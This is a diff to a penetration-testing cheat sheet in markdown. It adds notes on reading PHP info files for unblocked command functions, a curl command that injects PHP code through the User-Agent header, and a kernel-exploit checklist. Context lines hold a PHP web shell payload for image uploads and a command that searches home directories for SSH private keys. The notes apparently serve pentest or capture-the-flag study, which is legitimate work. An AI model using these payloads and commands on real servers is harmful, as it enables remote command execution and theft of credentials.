@@ -109,6 +109,14 @@ Insert SQL payloads in input fields to extract data from the database.
 
 #### PHP
 
+##### PHP Info File
+It is a file that contains information about the PHP configuration on the server. It can be used to find vulnerabilities and misconfigurations.
+
+- `disable_functions`: List of disabled PHP functions. If dangerous functions like `exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, etc. are not listed here, they can be used to execute commands on the server.
+
+- `User-Agent`: The user agent string of the web server is rendered. It can be used to identify the server software and version. 
+    - We can change it to a php shell payload to try to execute commands. `curl -s -X GET http://TARGET_IP[:PORT]/ -H "User-Agent: <?php system('whoami'); ?>" | grep -i "User-Agent"`
+
 ##### Image Upload Vulnerability
 - Add a PHP payload to an image file `<?php system($_GET['cmd']);?>`
 - Add `pre` tags to the payload to avoid corruption `<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>`
@@ -346,7 +354,9 @@ If a server has in its `~/.ssh/authorized_keys` file a public key for which you 
     - To check for private keys `find /home/ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null`
     - To check for config files `find /home/ -name "config" 2>/dev/null` -->
 
--
+### Kernel Exploits
+- Check kernel version `uname -r`
+- Search for exploits online
 
 ### To check
 - Current user `whoami`
